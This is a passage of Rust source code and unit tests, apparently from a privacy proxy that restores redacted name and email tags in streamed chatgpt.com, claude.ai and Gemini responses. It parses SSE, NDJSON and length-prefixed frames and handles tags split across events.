        Value::String(_) => out.push(path.clone()),
        Value::Array(items) => {
            for (i, x) in items.iter().enumerate() {
                path.push(Seg::Index(i));
                leaf_paths(x, path, out);
                path.pop();
            }
        }
        Value::Object(map) => {
            for (k, x) in map {
                path.push(Seg::Key(k.clone()));
                leaf_paths(x, path, out);
                path.pop();
            }
        }
        _ => {}
    }
}

fn render_path(path: &[Seg]) -> String {
    path.iter()
        .map(|s| match s {
            Seg::Key(k) => k.clone(),
            Seg::Index(i) => i.to_string(),
        })
        .collect::<Vec<_>>()
        .join("/")
}

/// How a key's successive values relate.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Kind {
    /// Known deltas (chatgpt.com appends, Claude text deltas).
    Delta,
    /// Known deltas of JSON text (tool-call `partial_json`).
    JsonDelta,
    /// Unknown: a value that extends the previous one is a snapshot of the
    /// whole text so far, anything else a delta.
    Auto,
}

/// One restorer key: a JSON path or a patch path.
struct Track {
    restorer: TextRestorer,
    kind: Kind,
    /// [`Kind::Auto`]: the previous value as it came, and as it went out.
    prev_raw: String,
    prev_out: String,
    /// The last raw text pushed (what the restorer may be holding back is a
    /// suffix of it).
    recent: String,
    /// The item (sequence number) and leaf that hold this key's latest text.
    last: Option<(u64, Leaf)>,
}

/// Keep the last `max` bytes of `s` (at a character boundary).
fn keep_tail(s: &mut String, max: usize) {
    if s.len() > max {
        let mut cut = s.len() - max;
        while !s.is_char_boundary(cut) {
            cut += 1;
        }
        s.drain(..cut);
    }
}

/// Is what `track`'s restorer holds back a whole surrogate on its own (not
/// the start of one still being streamed)?
fn held_tag_is_complete(engine: &Engine, scope: &str, track: &Track) -> bool {
    let held = track.restorer.pending_len();
    if held == 0 || held > track.recent.len() {
        return false;
    }
    let mut start = track.recent.len() - held;
    while !track.recent.is_char_boundary(start) {
        start += 1;
    }
    let tail = &track.recent[start..];
    engine.restore(tail, scope) != tail
}

/// The per-stream state shared by SSE and NDJSON.
struct Events {
    engine: Engine,
    scope: String,
    tracks: HashMap<String, Track>,
    /// Keys holding text back.
    pending: HashSet<String>,
    /// Items held back, oldest first; the first has sequence `first_seq`.
    queue: VecDeque<Item>,
    first_seq: u64,
    queued_bytes: usize,
    /// Text flushed into the item being processed (applied after it).
    current: Vec<(Leaf, String)>,
    /// chatgpt.com delta encoding: the last patch path and operation.
    last_p: String,
    last_o: Option<String>,
}

fn is_patch_event(v: &Value) -> bool {
    v.as_object().is_some_and(|m| {
        m.contains_key("v")
            && m.keys()
                .all(|k| matches!(k.as_str(), "p" | "o" | "v" | "c"))
    })
}

/// How text starts, read as JSON.
#[derive(Debug, PartialEq, Eq)]
enum JsonStart {
    /// An unfinished object or array that has reached a string or an
    /// object (`{"`, `["`, `[1, {`): JSON text.
    Clear,
    /// An unfinished object or array, nothing telling yet (`[`, `[1, 2`).
    Open,
    /// A complete object or array ending at this byte offset (`[1]`).
    Closed(usize),
    /// Not JSON (`[NAME_1]`, `[1] see`, prose).
    Not,
    /// Clearly JSON, then not valid (`["a", ]`, `{"v": NaN}`).
    Broken,
}

/// Read the start of `text` as JSON (see [`JsonStart`]).
fn json_start(text: &str) -> JsonStart {
    #[derive(PartialEq)]
    enum Expect {
        Value,
        /// A key or the end of an object.
        KeyOrEnd,
        Key,
        Colon,
        /// `,` or the end of the current container.
        CommaOrEnd,
        /// A value or the end of an array.
        ValueOrEnd,
    }
    let invalid = |clear| {
        if clear {
            JsonStart::Broken
        } else {
            JsonStart::Not
        }
    };
    let b = text.as_bytes();
    if !matches!(b.first(), Some(b'{' | b'[')) {
        return JsonStart::Not;
    }
    let mut stack: Vec<u8> = Vec::new();
    let mut expect = Expect::Value;
    let mut clear = false;
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        if c.is_ascii_whitespace() {
            i += 1;
            continue;
        }
        let value_start = matches!(expect, Expect::Value | Expect::ValueOrEnd);
        match c {
            b'{' | b'[' if value_start => {
                clear |= c == b'{' && !stack.is_empty();
                stack.push(c);
                expect = if c == b'{' {
                    Expect::KeyOrEnd
                } else {
                    Expect::ValueOrEnd
                };
                i += 1;
            }
            b'}' if matches!(expect, Expect::KeyOrEnd | Expect::CommaOrEnd)
                && stack.last() == Some(&b'{') =>
            {
                stack.pop();
                expect = Expect::CommaOrEnd;
                i += 1;
            }
            b']' if matches!(expect, Expect::ValueOrEnd | Expect::CommaOrEnd)
                && stack.last() == Some(&b'[') =>
            {
                stack.pop();
                expect = Expect::CommaOrEnd;
                i += 1;
            }
            b',' if expect == Expect::CommaOrEnd && !stack.is_empty() => {
                expect = if stack.last() == Some(&b'{') {
                    Expect::Key
                } else {
                    Expect::Value
                };
                i += 1;
            }
            b':' if expect == Expect::Colon => {
                expect = Expect::Value;
                i += 1;
            }
            b'"' if value_start || matches!(expect, Expect::KeyOrEnd | Expect::Key) => {
                clear = true;
                let key = matches!(expect, Expect::KeyOrEnd | Expect::Key);
                i += 1;
                loop {
                    match b.get(i) {
                        None => return JsonStart::Clear,
                        Some(b'\\') => i += 2,
                        Some(b'"') => break,
                        Some(_) => i += 1,
                    }
                }
                i += 1;
                expect = if key {
                    Expect::Colon
                } else {
                    Expect::CommaOrEnd
                };
            }
            b'-' | b'0'..=b'9' if value_start => {
                while i < b.len() && matches!(b[i], b'0'..=b'9' | b'-' | b'+' | b'.' | b'e' | b'E')
                {
                    i += 1;
                }
                expect = Expect::CommaOrEnd;
            }
            b't' | b'f' | b'n' if value_start => {
                let word: &[u8] = match c {
                    b't' => b"true",
                    b'f' => b"false",
                    _ => b"null",
                };
                let rest = &b[i..];
                let n = rest.len().min(word.len());
                if rest[..n] != word[..n] {
                    return invalid(clear);
                }
                i += n;
                expect = Expect::CommaOrEnd;
            }
            _ => return invalid(clear),
        }
        if stack.is_empty() {
            return JsonStart::Closed(i);
        }
    }
    if clear {
        JsonStart::Clear
    } else {
        JsonStart::Open
    }
}

/// Is `text` the start of a JSON object or array that is not finished yet
/// (`{"q": "x`, `[1, "a`)? Text that merely starts with a bracket
/// (`[NAME_1] said`, `[1] see`) is not.
fn is_json_prefix(text: &str) -> bool {
    matches!(json_start(text), JsonStart::Clear | JsonStart::Open)
}

/// Does `text` (after a BOM and whitespace) start like a JSON object, array
/// or string?
fn looks_like_json(text: &str) -> bool {
    matches!(
        text.trim_start_matches('\u{feff}')
            .trim_start()
            .chars()
            .next(),
        Some('{' | '[' | '"')
    )
}

/// Normalised patch path: no leading `/`.
fn norm(p: &str) -> String {
    p.trim_start_matches('/').to_string()
}

fn patch_key(p: &str) -> String {
    format!("\u{1}{p}")
}

fn join_key(key: &str, rel: &str) -> String {
    if rel.is_empty() {
        key.to_string()
    } else if key == "\u{1}" {
        format!("{key}{rel}")
    } else {
        format!("{key}/{rel}")
    }
}

fn is_stop(item: &Item, json: Option<&Value>) -> bool {
    item.data == "[DONE]"
        || matches!(item.name(), "done" | "message_stop" | "content_block_stop")
        || json
            .and_then(|v| v.get("type"))
            .and_then(Value::as_str)
            .is_some_and(|t| {
                matches!(
                    t,
                    "message_stop" | "content_block_stop" | "message_stream_complete" | "done"
                )
            })
}

impl Events {
    fn new(engine: &Engine, scope: &str) -> Self {
        Events {
            engine: engine.clone(),
            scope: scope.to_string(),
            tracks: HashMap::new(),
            pending: HashSet::new(),
            queue: VecDeque::new(),
            first_seq: 0,
            queued_bytes: 0,
            current: Vec::new(),
            last_p: String::new(),
            last_o: None,
        }
    }

    /// Restore one item; returns the items ready to go out, in order.
    fn on_item(&mut self, mut item: Item) -> Vec<Item> {
        let seq = self.first_seq + self.queue.len() as u64;
        let looks_json = looks_like_json(&item.data);
        // Parsed as browsers do (a BOM, lone surrogates); JSON-looking data
        // that still does not parse goes out as it came, never restored as
        // text (that could splice a value into JSON).
        let mut json = if looks_json {
            parda_wire::body::parse_json(item.data.as_bytes()).ok()
        } else {
            None
        };
        if is_stop(&item, json.as_ref()) {
            self.flush_all(seq);
        }
        let mut changed = false;
        match json.as_mut() {
            Some(v) => changed = self.restore_json(seq, item.name().to_string(), v),
            None if !looks_json
                && item.sse.is_some()
                && !item.data.is_empty()
                && item.data != "[DONE]" =>
            {
                let mut data = item.data.clone();
                changed = self.push(TEXT_KEY, seq, Leaf::Data, &mut data, Kind::Delta);
                item.text = Some(data);
            }
            None => {}
        }
        for (leaf, tail) in std::mem::take(&mut self.current) {
            append_at(json.as_mut(), &mut item.text, &item.data, &leaf, &tail);
            changed = true;
        }
        item.json = json;
        item.changed |= changed;
        self.queued_bytes += item.data.len();
        self.queue.push_back(item);
        if !self.pending.is_empty()
            && self.queue.len() < MAX_HELD_EVENTS
            && self.queued_bytes < MAX_HELD_BYTES
        {
            return Vec::new();
        }
        self.flush_all(u64::MAX);
        self.drain()
    }

    /// The end of the stream: flush everything held back.
    fn finish(&mut self) -> Vec<Item> {
        self.flush_all(u64::MAX);
        self.drain()
    }

    fn drain(&mut self) -> Vec<Item> {
        self.first_seq += self.queue.len() as u64;
        self.queued_bytes = 0;
        self.queue.drain(..).collect()
    }

    /// Restore the string leaves of one JSON item.
    fn restore_json(&mut self, seq: u64, name: String, v: &mut Value) -> bool {
        if is_patch_event(v) {
            return self.patch_event(seq, v);
        }
        let index = v.get("index").map(Value::to_string).unwrap_or_default();
        let delta = matches!(
            v.get("type").and_then(Value::as_str),
            Some("content_block_delta" | "completion")
        );
        let prefix = format!("{name}|{index}|");
        let mut paths = Vec::new();
        leaf_paths(v, &mut Vec::new(), &mut paths);
        let mut changed = false;
        for path in paths {
            let kind = match path.last() {
                Some(Seg::Key(k)) if JSON_DELTA_KEYS.contains(&k.as_str()) => Kind::JsonDelta,
                _ if delta => Kind::Delta,
                _ => Kind::Auto,
            };
            let key = format!("{prefix}{}", render_path(&path));
            if let Some(Value::String(s)) = pointer_mut(v, &path) {
                changed |= self.push(&key, seq, Leaf::Json(path), s, kind);
            }
        }
        changed
    }

    /// chatgpt.com delta encoding: `{"p": path, "o": op, "v": value}`,
    /// `{"v": …}` continuing the last path and op, and `patch` batches.
    fn patch_event(&mut self, seq: u64, v: &mut Value) -> bool {
        let Some(obj) = v.as_object_mut() else {
            return false;
        };
        let p = obj.get("p").and_then(Value::as_str).map(norm);
        let o = obj
            .get("o")
            .and_then(Value::as_str)
            .map(str::to_ascii_lowercase);
        if let Some(p) = &p {
            self.last_p = p.clone();
        }
        if let Some(o) = &o {
            self.last_o = Some(o.clone());
        }
        let Some(val) = obj.get_mut("v") else {
            return false;
        };
        let op = o
            .or_else(|| self.last_o.clone())
            .unwrap_or_else(|| if val.is_string() { "append" } else { "add" }.to_string());
        let path = self.last_p.clone();
        if op == "patch"
            && let Value::Array(ops) = val
        {
            let mut changed = false;
            let mut last = None;
            for (i, item) in ops.iter_mut().enumerate() {
                let Some(m) = item.as_object_mut() else {
                    continue;
                };
                let op_p = m
                    .get("p")
                    .and_then(Value::as_str)
                    .map(norm)
                    .unwrap_or_default();
                let op_o = m
                    .get("o")
                    .and_then(Value::as_str)
                    .map_or_else(|| "append".to_string(), str::to_ascii_lowercase);
                if let Some(op_v) = m.get_mut("v") {
                    let base = vec![Seg::Key("v".into()), Seg::Index(i), Seg::Key("v".into())];
                    changed |= self.apply_op(seq, base, &op_p, &op_o, op_v);
                }
                last = Some((op_p, op_o));
            }
            // A bare `{"v"}` that follows continues the batch's last op.
            if let Some((p, o)) = last {
                self.last_p = p;
                self.last_o = Some(o);
            }
            return changed;
        }
        self.apply_op(seq, vec![Seg::Key("v".into())], &path, &op, val)
    }

    fn apply_op(&mut self, seq: u64, base: Vec<Seg>, p: &str, op: &str, v: &mut Value) -> bool {
        let key = patch_key(p);
        if matches!(op, "add" | "replace" | "set") {
            // A new value replaces the old one (and everything under it).
            // Any other op (`append`, or one parda does not know, such as
            // `truncate`) keeps the text's state.
            self.reset(&key, seq);
        }
        match v {
            Value::String(s) => self.push(&key, seq, Leaf::Json(base), s, Kind::Delta),
            Value::Object(_) | Value::Array(_) => {
                let mut paths = Vec::new();
                leaf_paths(v, &mut Vec::new(), &mut paths);
                let mut changed = false;
                for rel in paths {
                    let k = join_key(&key, &render_path(&rel));
                    let mut full = base.clone();
                    full.extend(rel.iter().cloned());
                    if let Some(Value::String(s)) = pointer_mut(v, &rel) {
                        changed |= self.push(&k, seq, Leaf::Json(full), s, Kind::Delta);
                    }
                }
                changed
            }
            _ => false,
        }
    }

    /// Flush and forget `key` and every key under it.
    fn reset(&mut self, key: &str, seq: u64) {
        let under = format!("{key}/");
        let keys: Vec<String> = self
            .tracks
            .keys()
            .filter(|k| {
                if key == "\u{1}" {
                    k.starts_with(key)
                } else {
                    *k == key || k.starts_with(&under)
                }
            })
            .cloned()
            .collect();
        for k in keys {
            self.flush_key(&k, seq);
            self.tracks.remove(&k);
        }
    }

    /// Restore `s` (the value of `key` in item `seq`, at `leaf`) in place.
    fn push(&mut self, key: &str, seq: u64, leaf: Leaf, s: &mut String, kind: Kind) -> bool {
        let Events {
            engine,
            scope,
            tracks,
            ..
        } = self;
        // JSON text arriving in pieces under a key parda does not know is
        // restored with JSON escaping, never as plain text.
        let json_text =
            kind == Kind::JsonDelta || (kind == Kind::Auto && is_json_prefix(s.trim_start()));
        let track = tracks.entry(key.to_string()).or_insert_with(|| Track {
            restorer: if json_text {
                TextRestorer::json(engine, scope)
            } else {
                TextRestorer::plain(engine, scope)
            },
            kind,
            prev_raw: String::new(),
            prev_out: String::new(),
            recent: String::new(),
            last: None,
        });
        if track.kind == Kind::Auto && json_container(s).is_some() {
            // A JSON document in a string, sent whole: restored at its own
            // level, never spliced into as text.
            return restore_string(engine, scope, s, 0);
        }
        let snapshot = track.kind == Kind::Auto
            && !track.prev_raw.is_empty()
            && s.starts_with(&track.prev_raw);
        if track.kind == Kind::Auto && !snapshot && held_tag_is_complete(engine, scope, track) {
            // A new value that does not extend the last one, while a whole
            // tag is held back: the last value was complete (a title, a
            // status line), so the tag goes back into it, not into this one.
            self.flush_key(key, seq);
            return self.push(key, seq, leaf, s, kind);
        }
        let track = self.tracks.get_mut(key).expect("inserted above");
        let raw = std::mem::take(s);
        track.recent.push_str(if snapshot {
            &raw[track.prev_raw.len()..]
        } else {
            &raw
        });
        keep_tail(&mut track.recent, 256);
        let out = if snapshot {
            let added = track.restorer.push(&raw[track.prev_raw.len()..]);
            let mut out = track.prev_out.clone();
            out.push_str(&added);
            out
        } else {
            track.restorer.push(&raw)
        };
        if track.kind == Kind::Auto {
            track.prev_raw.clone_from(&raw);
            track.prev_out.clone_from(&out);
        }
        track.last = Some((seq, leaf));
        if track.restorer.pending_len() > 0 {
            self.pending.insert(key.to_string());
        } else {
            self.pending.remove(key);
        }
        let changed = out != raw;
        *s = out;
        changed
    }

    /// Flush what `key` holds back into the item that holds its latest text.
    /// (Also clears what the restorer was holding.)
    /// `current` is the sequence number of the item being processed.
    fn flush_key(&mut self, key: &str, current: u64) {
        self.pending.remove(key);
        let Some(track) = self.tracks.get_mut(key) else {
            return;
        };
        let tail = track.restorer.finish();
        if tail.is_empty() {
            return;
        }
        if track.kind == Kind::Auto {
            track.prev_out.push_str(&tail);
        }
        let Some((seq, leaf)) = track.last.clone() else {
            return;
        };
        if seq == current {
            self.current.push((leaf, tail));
        } else if let Some(item) = seq
            .checked_sub(self.first_seq)
            .and_then(|i| self.queue.get_mut(i as usize))
        {
            append_at(item.json.as_mut(), &mut item.text, &item.data, &leaf, &tail);
            item.changed = true;
        } else {
            tracing::warn!("intercept: held-back text had no event to go into");
        }
    }

    fn flush_all(&mut self, current: u64) {
        let keys: Vec<String> = self.pending.iter().cloned().collect();
        for k in keys {
            self.flush_key(&k, current);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine_transform::tests::{EMOJI, QUOTED, engine};
    use parda_wire::sse::{SseEvent, SseParser};
    use proptest::prelude::*;
    use serde_json::{Value, json};

    const SCOPE: &str = "global";

    /// An engine with `[NAME_1]` = Ravi Kumar and `[EMAIL_1]` =
    /// ravi@example.com in the global scope.
    fn tagged(dir: &std::path::Path) -> Engine {
        let e = engine(dir);
        let r = e
            .redact("Ravi Kumar wrote to ravi@example.com", SCOPE)
            .unwrap();
        assert_eq!(r.text, "[NAME_1] wrote to [EMAIL_1]");
        e
    }

    /// Run `body` through a rewriter for `ct`, in chunks of `n` bytes.
    fn run(e: &Engine, ct: &str, body: &[u8], n: usize) -> Vec<u8> {
        let mut t = for_content_type(e, SCOPE, ct);
        let mut out = Vec::new();
        for c in body.chunks(n.max(1)) {
            out.extend_from_slice(&t.push(c));
        }
        out.extend_from_slice(&t.finish());
        out
    }

    fn events(body: &[u8]) -> Vec<SseEvent> {
        let mut p = SseParser::default();
        let mut evs = p.feed(body);
        evs.extend(p.finish());
        evs
    }

    fn sse(evs: &[(Option<&str>, String)]) -> Vec<u8> {
        let mut out = String::new();
        for (name, data) in evs {
            if let Some(n) = name {
                out.push_str(&format!("event: {n}\n"));
            }
            out.push_str(&format!("data: {data}\n\n"));
        }
        out.into_bytes()
    }

    /// The text a chatgpt.com client builds from a delta-encoded stream:
    /// appends to `/message/content/parts/0`, via explicit `p`, bare `{"v"}`
    /// continuations and `patch` batches.
    fn chatgpt_text(out: &[u8]) -> String {
        const PART: &str = "/message/content/parts/0";
        let mut text = String::new();
        let mut last_p = String::new();
        let mut last_o = String::new();
        let apply = |p: &str, o: &str, v: &Value, text: &mut String| match (o, v) {
            ("append", Value::String(s)) if p == PART => text.push_str(s),
            ("add", Value::Object(_)) if p.is_empty() => {
                if let Some(s) = v["message"]["content"]["parts"][0].as_str() {
                    *text = s.to_string();
                }
            }
            _ => {}
        };
        for ev in events(out) {
            let Ok(v) = serde_json::from_str::<Value>(&ev.data) else {
                continue;
            };
            if ev.event.as_deref() != Some("delta") {
                continue;
            }
            if let Some(p) = v.get("p").and_then(Value::as_str) {
                last_p = p.to_string();
            }
            if let Some(o) = v.get("o").and_then(Value::as_str) {
                last_o = o.to_string();
            }
            if last_o == "patch" {
                for op in v["v"].as_array().into_iter().flatten() {
                    apply(
                        op["p"].as_str().unwrap_or(""),
                        op["o"].as_str().unwrap_or(""),
                        &op["v"],
                        &mut text,
                    );
                }
            } else {
                apply(&last_p, &last_o, &v["v"], &mut text);
            }
        }
        text
    }

    /// A chatgpt.com delta-encoded answer whose text is `pieces` joined.
    fn chatgpt_stream(pieces: &[&str]) -> Vec<u8> {
        let mut evs = vec![
            (Some("delta_encoding"), "\"v1\"".to_string()),
            (
                Some("delta"),
                json!({"p": "", "o": "add", "v": {"message": {
                    "id": "m1", "author": {"role": "assistant"},
                    "content": {"content_type": "text", "parts": [""]},
                    "status": "in_progress"}, "conversation_id": "c1"}, "c": 0})
                .to_string(),
            ),
        ];
        for (i, piece) in pieces.iter().enumerate() {
            let data = match i % 3 {
                0 => json!({"p": "/message/content/parts/0", "o": "append", "v": piece}),
                1 => json!({"v": piece}),
                _ => json!({"p": "", "o": "patch", "v": [
                    {"p": "/message/content/parts/0", "o": "append", "v": piece},
                    {"p": "/message/metadata", "o": "append", "v": {}}]}),
            };
            evs.push((Some("delta"), data.to_string()));
            if i % 4 == 3 {
                evs.push((
                    None,
                    json!({"type": "server_ste_metadata", "metadata": {"turn": i}}).to_string(),
                ));
            }
        }
        evs.push((
            Some("delta"),
            json!({"p": "/message/status", "o": "replace", "v": "finished_successfully"})
                .to_string(),
        ));
        evs.push((
            None,
            json!({"type": "message_stream_complete", "conversation_id": "c1"}).to_string(),
        ));
        evs.push((None, "[DONE]".to_string()));
        sse(&evs)
    }

    /// The text a claude.ai client builds from `completion` events and
    /// `content_block_delta` text deltas.
    fn claude_text(out: &[u8]) -> String {
        let mut text = String::new();
        for ev in events(out) {
            let Ok(v) = serde_json::from_str::<Value>(&ev.data) else {
                continue;
            };
            match v["type"].as_str() {
                Some("completion") => text.push_str(v["completion"].as_str().unwrap_or("")),
                Some("content_block_delta") => {
                    text.push_str(v["delta"]["text"].as_str().unwrap_or(""))
                }
                _ => {}
            }
        }
        text
    }

    fn claude_stream(pieces: &[&str], blocks: bool) -> Vec<u8> {
        let mut evs = vec![(
            Some("message_start"),
            json!({"type": "message_start", "message": {"id": "msg_1", "content": []}}).to_string(),
        )];
        if blocks {
            evs.push((
                Some("content_block_start"),
                json!({"type": "content_block_start", "index": 0,
                       "content_block": {"type": "text", "text": ""}})
                .to_string(),
            ));
        }
        for (i, piece) in pieces.iter().enumerate() {
            if i == 1 {
                evs.push((Some("ping"), json!({"type": "ping"}).to_string()));
            }
            let data = if blocks {
                json!({"type": "content_block_delta", "index": 0,
                       "delta": {"type": "text_delta", "text": piece}})
            } else {
                json!({"type": "completion", "completion": piece, "stop_reason": null,
                       "log_id": "abc", "messageLimit": {"type": "within_limit"}})
            };
            let name = if blocks {
                "content_block_delta"
            } else {
                "completion"
            };
            evs.push((Some(name), data.to_string()));
        }
        if blocks {
            evs.push((
                Some("content_block_stop"),
                json!({"type": "content_block_stop", "index": 0}).to_string(),
            ));
        }
        evs.push((
            Some("message_stop"),
            json!({"type": "message_stop"}).to_string(),
        ));
        sse(&evs)
    }

    #[test]
    fn chatgpt_delta_encoding_restores_a_tag_split_across_three_events() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let pieces = ["Sure, I will email [NA", "ME_", "1] at [EMAIL_1] now."];
        let body = chatgpt_stream(&pieces);
        for n in [1, 2, 3, 7, 64, body.len()] {
            let out = run(&e, "text/event-stream; charset=utf-8", &body, n);
            assert_eq!(
                chatgpt_text(&out),
                "Sure, I will email Ravi Kumar at ravi@example.com now.",
                "chunks of {n}"
            );
            // No event is invented or lost.
            assert_eq!(events(&out).len(), events(&body).len());
        }
    }

    #[test]
    fn claude_completion_and_content_block_deltas_restore_split_tags() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let pieces = ["Hello [NAM", "E_1], your mail is [EM", "AIL_1]."];
        for blocks in [false, true] {
            let body = claude_stream(&pieces, blocks);
            for n in [1, 5, body.len()] {
                let out = run(&e, "text/event-stream", &body, n);
                assert_eq!(
                    claude_text(&out),
                    "Hello Ravi Kumar, your mail is ravi@example.com.",
                    "blocks {blocks}, chunks of {n}"
                );
            }
        }
    }

    #[test]
    fn a_held_back_tail_is_flushed_into_the_last_event() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // The stream ends inside something that looks like a tag.
        let body = sse(&[
            (
                None,
                json!({"type": "completion", "completion": "see [NAME_1] and [NA"}).to_string(),
            ),
            (
                None,
                json!({"type": "completion", "completion": "ME"}).to_string(),
            ),
        ]);
        let out = run(&e, "text/event-stream", &body, 3);
        assert_eq!(claude_text(&out), "see Ravi Kumar and [NAME");
        assert_eq!(events(&out).len(), 2);
        // Plain data lines share one restorer per stream.
        let body = b"data: Hi [NA\n\ndata: ME_1]!\n\ndata: [EMA\n\n";
        let out = run(&e, "text/event-stream", body, 4);
        let text: String = events(&out).into_iter().map(|ev| ev.data).collect();
        assert_eq!(text, "Hi Ravi Kumar![EMA");
    }

    #[test]
    fn cumulative_snapshots_restore_whole() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // Each event carries the whole answer so far.
        let snaps = [
            "Hi [NA",
            "Hi [NAME_1], wr",
            "Hi [NAME_1], write to [EMAIL_1]",
        ];
        let body = sse(&snaps
            .iter()
            .map(|s| (None, json!({"answer": {"text": s}, "step": 1}).to_string()))
            .collect::<Vec<_>>());
        let out = run(&e, "text/event-stream", &body, 6);
        let texts: Vec<String> = events(&out)
            .iter()
            .map(|ev| {
                let v: Value = serde_json::from_str(&ev.data).unwrap();
                v["answer"]["text"].as_str().unwrap().to_string()
            })
            .collect();
        assert_eq!(
            texts.last().unwrap(),
            "Hi Ravi Kumar, write to ravi@example.com"
        );
        assert_eq!(texts[1], "Hi Ravi Kumar, wr");
    }

    #[test]
    fn ndjson_token_lines_restore_per_path() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let mut body = String::new();
        for t in ["Dear [", "NAME", "_1", "], ok"] {
            body.push_str(&json!({"result": {"response": {"token": t}}}).to_string());
            body.push('\n');
        }
        body.push_str("{\"result\": {\"done\": true}}");
        let out = run(&e, "application/x-ndjson", body.as_bytes(), 5);
        let out = String::from_utf8(out).unwrap();
        let text: String = out
            .lines()
            .filter_map(|l| serde_json::from_str::<Value>(l).ok())
            .filter_map(|v| {
                v["result"]["response"]["token"]
                    .as_str()
                    .map(str::to_string)
            })
            .collect();
        assert_eq!(text, "Dear Ravi Kumar, ok");
        assert!(out.ends_with("{\"result\": {\"done\": true}}"));
    }

    #[test]
    fn json_documents_restore_every_leaf() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // A chatgpt.com conversation history.
        let raw = r#"{"title":"Mail for [NAME_1]","mapping":{"a":{"message":{"content":{"parts":["Write to [EMAIL_1]"]},"weight":1.0}}},"big":123456789012345678901234567890}"#;
        for n in [1, 9, raw.len()] {
            let out = run(&e, "application/json", raw.as_bytes(), n);
            assert_eq!(
                String::from_utf8(out).unwrap(),
                raw.replace("[NAME_1]", "Ravi Kumar")
                    .replace("[EMAIL_1]", "ravi@example.com")
            );
        }
        // Nothing to restore: the exact bytes.
        let raw = "{ \"a\" : \"\\u0041\" }";
        assert_eq!(
            run(&e, "application/json", raw.as_bytes(), 2),
            raw.as_bytes()
        );
        // A value with a quote and a backslash is restored exactly and the
        // JSON stays valid, also inside JSON carried in a string.
        let q = quoted_tag(&e);
        let inner = json!([[format!("at {q}")]]).to_string();
        let doc = json!({"t": format!("{q} says"), "inner": inner}).to_string();
        for n in [1, 4, doc.len()] {
            let out = run(&e, "application/json", doc.as_bytes(), n);
            let v: Value = serde_json::from_slice(&out).unwrap();
            assert_eq!(v["t"], format!("{QUOTED} says"));
            let inner: Value = serde_json::from_str(v["inner"].as_str().unwrap()).unwrap();
            assert_eq!(inner[0][0], format!("at {QUOTED}"));
        }
        // Not JSON after all: passed through, never spliced into.
        let out = run(&e, "application/json", b"oops [NAME_1]", 4);
        assert_eq!(out, b"oops [NAME_1]");
    }

    fn utf16_len(s: &str) -> usize {
        s.encode_utf16().count()
    }

    /// A Google length-prefixed frame: the number counts the payload in
    /// UTF-16 code units, starting right after the digits.
    fn frame(json: &str) -> String {
        let payload = format!("\n{json}\n");
        format!("{}{payload}", utf16_len(&payload))
    }

    /// The frames of a `)]}'` body, read as Gemini's client does (a wrong
    /// length breaks this).
    fn frames(body: &str) -> Vec<String> {
        let rest = body.strip_prefix(")]}'\n").expect("prefix");
        let u: Vec<u16> = rest.encode_utf16().collect();
        let ws = |c: u16| c == 0x20 || c == 0x0a || c == 0x0d || c == 0x09;
        let (mut i, mut out) = (0, Vec::new());
        loop {
            while i < u.len() && ws(u[i]) {
                i += 1;
            }
            if i >= u.len() {
                return out;
            }
            let start = i;
            while i < u.len() && (0x30..=0x39).contains(&u[i]) {
                i += 1;
            }
            let n: usize = String::from_utf16(&u[start..i]).unwrap().parse().unwrap();
            assert!(i + n <= u.len(), "frame runs past the end: {body:?}");
            out.push(String::from_utf16(&u[i..i + n]).unwrap().trim().to_string());
            i += n;
        }
    }

    #[test]
    fn frame_lengths_are_measured_once_and_exactly() {
        let scan = |units| FrameScan {
            digits: 0,
            units,
            bytes: 0,
            counted: 0,
        };
        // "é😀a" is 1 + 2 + 1 UTF-16 units in 2 + 4 + 1 bytes; whatever
        // follows the frame is never read past.
        let payload = "é😀a".to_string() + &"x".repeat(1000) + "\u{ff}";
        let p = payload.as_bytes();
        assert_eq!(scan(4).measure(p), Measure::Done(7));
        assert_eq!(scan(0).measure(p), Measure::Done(0));
        // A count that ends inside a surrogate pair.
        assert_eq!(scan(2).measure(p), Measure::Invalid);
        // Byte by byte, then far past the frame in one go.
        let mut s = scan(4);
        for n in 0..p.len().min(7) {
            assert_eq!(s.measure(&p[..n]), Measure::Need, "{n}");
        }
        assert_eq!(s.measure(p), Measure::Done(7));
        // Longer than what has arrived; then invalid UTF-8 inside it.
        assert_eq!(scan(5000).measure(p), Measure::Need);
        assert_eq!(scan(5000).measure(b"ab\xffcd"), Measure::Invalid);
    }

    #[test]
    fn google_frames_are_restored_with_recomputed_lengths() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let q = quoted_tag(&e);
        let em = e.redact(EMOJI, SCOPE).unwrap().text;
        let f1 = json!([[
            "wrb.fr",
            null,
            json!([[format!("Hi [NAME_1] {q}")]]).to_string()
        ]])
        .to_string();
        let f2 = json!([["di", 42], ["af.httprm", 42, "-1", 7]]).to_string();
        let f3 = json!([[
            "wrb.fr",
            null,
            json!([[format!("at {em} \u{1f600}")]]).to_string()
        ]])
        .to_string();
        let body = format!(")]}}'\n\n{}{}{}", frame(&f1), frame(&f2), frame(&f3));
        for n in [1, 2, 3, 7, 50, body.len()] {
            let out = run(&e, "application/json; charset=utf-8", body.as_bytes(), n);
            let out = String::from_utf8(out).unwrap();
            let fr = frames(&out);
            assert_eq!(fr.len(), 3, "{n}: {out:?}");
            let inner = |f: &str| -> Value {
                let v: Value = serde_json::from_str(f).unwrap();
                serde_json::from_str(v[0][2].as_str().unwrap()).unwrap()
            };
            assert_eq!(inner(&fr[0])[0][0], format!("Hi Ravi Kumar {QUOTED}"));
            assert_eq!(fr[1], f2, "an unchanged frame keeps its bytes");
            assert_eq!(inner(&fr[2])[0][0], format!("at {EMOJI} \u{1f600}"));
        }
        // A frame whose payload is not JSON passes with its own length;
        // text that is not framed passes as it came.
        for odd in [
            format!(")]}}'\n\n{}", frame("not json [NAME_1]")),
            ")]}'\nhello [NAME_1]".to_string(),
            format!(")]}}'\n\n999{}", "\n[[\"[NAME_1]\"]]\n"),
        ] {
            for n in [1, 4, odd.len()] {
                assert_eq!(
